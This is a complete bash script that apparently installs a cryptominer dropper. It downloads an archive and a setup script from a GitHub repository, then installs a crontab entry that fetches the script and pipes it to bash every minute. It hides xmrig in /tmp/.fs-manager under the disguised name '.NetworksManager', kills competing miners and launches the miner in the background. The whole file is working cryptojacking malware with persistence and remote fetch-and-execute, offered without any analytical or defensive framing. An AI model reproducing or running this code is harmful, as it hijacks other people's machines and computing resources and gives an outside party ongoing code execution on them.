#!/bin/bash
# find a good writable path q
workdir="/tmp"
files="https://github.com/uzidlrxvs/fos/raw/main/dasdsa.tar.gz"
setupurl="https://github.com/uzidlrxvs/fos/raw/main/w.sh"

# check if xmrig is runing
if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
    # if not already runing, launch xmrig with nohup
    echo "running proccess"
	rm -r /tmp/w.sh
    exit
fi

# kill old instances of xmrig
 
if [[ $(ps -ef | grep xmrig | grep -v grep | wc -l) != 0 ]]; then
    killall xmrig
	killall NetworksManager
fi

# crontab
# save current crontab to a file
 
cronfile="${workdir}/.crontab.tmp"
crontab -l > "${cronfile}"

# check if we already have cron setup
if ! grep -q "${setupurl}" "${cronfile}"; then
 
    # setup new cron if needed
    echo "* * * * * curl -L -o /tmp/w.sh \"${setupurl}\" | bash; wget -P "/tmp/" \"${setupurl}\" | bash; chmod +x /tmp/w.sh; /tmp/w.sh | bash" >> "${cronfile}"

 
    # report to hq
    echo "Cron installed"
 
fi
crontab "${cronfile}"
rm -r "${cronfile}"

# check if we have executable / download
if [ ! -f "/tmp/.fs-manager/.NetworksManager" ]; then
    echo "NetworksManager not found"
    download=1
else
    echo "NetworksManager found"
    # verify config is up to date
       # if not - kill xmrig, update config
fi
 
 
launch=0
if [ $download = 1 ]; then
    echo "Downloading files"
 
    curl -L -o "/tmp/dasdsa.tar.gz" "${files}"
	wget -P "/tmp/" "${files}"
 
    if [ ! -f "/tmp/dasdsa.tar.gz" ]; then
        echo "files dl failed"
        exit
    fi
 
    cd "/tmp"
    tar xvzf dasdsa.tar.gz > /dev/null 2>&1
 
 

 
    rm -f dasdsa.tar.gz
    mv /tmp/fs-manager /tmp/.fs-manager
    mv /tmp/.fs-manager/Service-Networks /tmp/.fs-manager/.Service-Networks
    mv /tmp/.fs-manager/NetworksManager /tmp/.fs-manager/.NetworksManager
    chmod +x /tmp/.fs-manager/.NetworksManager
    touch /tmp/.fs-manager/.out.log
    chmod +x /tmp/.fs-manager/.out.log
	chmod +x /tmp/.fs-manager/.Service-Networks
	chmod 555 /tmp/.fs-manager/config.json
 

fi

# check if xmrig is runing
if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) = 0 ]]; then
    # if not already runing, launch xmrig with nohup
    launch=1
fi
 
if [ $launch = 1 ]; then
    #nohup
    cd "/tmp/.fs-manager"
    #nohup ./NetworksManager > out.log 2>&1 &
	nohup ./.Service-Networks -s "NetworksManager" ./.NetworksManager > .out.log 2>&1 &
	rm -r /tmp/w.sh
fi

echo "all done"
